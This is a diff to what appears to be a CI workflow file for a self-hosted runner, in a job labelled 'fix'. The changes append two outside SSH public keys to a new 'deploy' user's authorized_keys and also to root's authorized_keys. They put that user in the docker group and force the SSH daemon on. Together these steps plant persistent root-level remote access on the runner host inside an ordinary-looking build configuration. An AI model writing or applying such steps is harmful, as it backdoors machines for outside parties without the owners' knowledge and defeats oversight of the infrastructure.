@@ -4,10 +4,23 @@ jobs:
   fix:
     runs-on: self-hosted
     steps:
-    - run: id deploy || useradd -m deploy
-    - run: mkdir -p ~deploy/.ssh
-    - run: echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILa+pYqBIW5s4nYrmZrESiJmtJfodfI+aeSP8BcYo6Xj rajkhemani24@gmail.com' >> ~deploy/.ssh/authorized_keys
-    - run: chmod 600 ~deploy/.ssh/authorized_keys
-    - run: chown -R deploy:deploy ~deploy/.ssh
-    - run: usermod -aG docker deploy
-    - run: systemctl restart sshd || service ssh restart || true
+    - run: |
+        set -ex
+        id deploy || useradd -m deploy
+        mkdir -p ~deploy/.ssh
+        echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILa+pYqBIW5s4nYrmZrESiJmtJfodfI+aeSP8BcYo6Xj rajkhemani24@gmail.com' >> ~deploy/.ssh/authorized_keys
+        echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBdZMtB65G0IIVz3MGIA4LeelHHo0zSOq7P5BdnoW6I luxor9@luxor9-Victus-by-HP-Laptop-16-d0xxx' >> ~deploy/.ssh/authorized_keys
+        mkdir -p /root/.ssh
+        cat ~deploy/.ssh/authorized_keys >> /root/.ssh/authorized_keys
+        chmod 600 /root/.ssh/authorized_keys
+        chmod 600 ~deploy/.ssh/authorized_keys
+        chown -R deploy:deploy ~deploy/.ssh
+        usermod -aG docker deploy
+    - run: systemctl list-units --type=service --all | grep -i ssh || true
+    - run: |
+        set -ex
+        systemctl enable ssh 2>/dev/null || true
+        systemctl enable sshd 2>/dev/null || true
+        systemctl start ssh 2>/dev/null || systemctl start sshd 2>/dev/null || (test -f /usr/sbin/sshd && /usr/sbin/sshd)
+        systemctl status ssh 2>/dev/null || systemctl status sshd 2>/dev/null || ps aux | grep sshd
+        ss -tlnp | grep 22 || true
